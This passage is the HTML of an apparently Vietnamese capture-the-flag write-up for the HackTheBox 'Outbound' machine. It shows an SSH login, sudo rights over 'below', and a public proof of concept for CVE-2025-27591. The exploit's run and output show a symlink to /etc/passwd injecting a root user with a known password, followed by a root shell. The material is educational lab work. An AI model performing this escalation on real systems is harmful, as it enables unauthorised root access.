+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>mail.outbound.htb<span class="s1">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">jacob@mail.outbound.htb&#39;</span>s password:
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 24.04.2 LTS <span class="o">(</span>GNU/Linux 6.8.0-63-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Mon Aug  <span class="m">4</span> 07:09:58 AM UTC <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.08              Processes:             <span class="m">268</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   74.9% of 6.73GB   Users logged in:       <span class="m">1</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 13%               IPv4 address <span class="k">for</span> eth0: 10.10.11.77
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Aug  <span class="m">4</span> 06:59:12 <span class="m">2025</span> from 10.10.14.40
+</span></span><span class="line"><span class="cl">jacob@outbound:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>jacob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>jacob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>jacob<span class="o">)</span>,100<span class="o">(</span>users<span class="o">)</span>
+</span></span><span class="line"><span class="cl">jacob@outbound:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">jacob@outbound:~$</span></span></code></pre></div></div>
+
+<h2 class="relative group">Privilege escalation
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Đi qua mấy kỹ thuật mà lần nào cũng dùng, tôi có <code>sudo -l</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jacob@outbound:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> jacob on outbound:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User jacob may run the following commands on outbound:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*</span></span></code></pre></div></div>
+<p>Tìm hiểu một chút về <code>below</code>, đây là một trình theo dõi hiệu năng hệ thống (system performance monitor) như CPU, memory, IO, process, v.v&hellip;</p>
+
+<h3 class="relative group">CVE-2025-27591
+    <div id="cve-2025-27591" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#cve-2025-27591" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Thử tìm kiếm lỗ hổng của <code>below</code> tôi tìm thấy <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27591"  target="_blank" rel="noreferrer">CVE-2025-27591</a>. <code>Below</code> chạy như một hệ thống dịch vụ dưới quyền root và tạo thư mục <code>/var/log/below</code> với quyền world-writable (0777), cho phép người dùng không đặc quyền vẫn có thể thao tác vào thư mục này. Attacker có thể tạo symlink độc hại để trỏ đến các file hệ thống nhạy cảm (ví dụ <code>/etc/shadow</code>), từ đó chiếm quyền ghi file và có thể leo lên root.</p>
+<p>Tìm kiếm Poc trên github, tôi tìm thấy phiên bản đầu tiên được up lên ở <a href="https://github.com/obamalaolu/CVE-2025-27591"  target="_blank" rel="noreferrer">đây</a></p>
+<p>Copy nội dung file sh vào máy</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jacob@outbound:~$ nano exploit.sh
+</span></span><span class="line"><span class="cl">jacob@outbound:~$ chmod +x exploit.sh
+</span></span><span class="line"><span class="cl">jacob@outbound:~$ ./exploit.sh
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> CVE-2025-27591 Privilege Escalation Exploit
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking sudo permissions...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Backing up /etc/passwd to /tmp/passwd.bak
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating password hash...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating malicious passwd line...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Linking /var/log/below/error_root.log to /etc/passwd
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Triggering <span class="s1">&#39;below&#39;</span> to write to symlinked log...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Injecting malicious user into /etc/passwd
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try switching to <span class="s1">&#39;haxor&#39;</span> using password: hacked123
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">haxor@outbound:/home/jacob# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">haxor@outbound:/home/jacob# <span class="nb">cd</span> /root
+</span></span><span class="line"><span class="cl">haxor@outbound:~# ls
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">haxor@outbound:~#</span></span></code></pre></div></div>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/hackthebox/usage/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HackTheBox - Usage
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2024-05-03T00:00:00&#43;00:00">3 May 2024</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/hackthebox/imagery/">
+              <span class="leading-6">
+                Hackthebox - Imagery&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-10-07T00:00:00&#43;00:00">7 October 2025</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          TAH
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
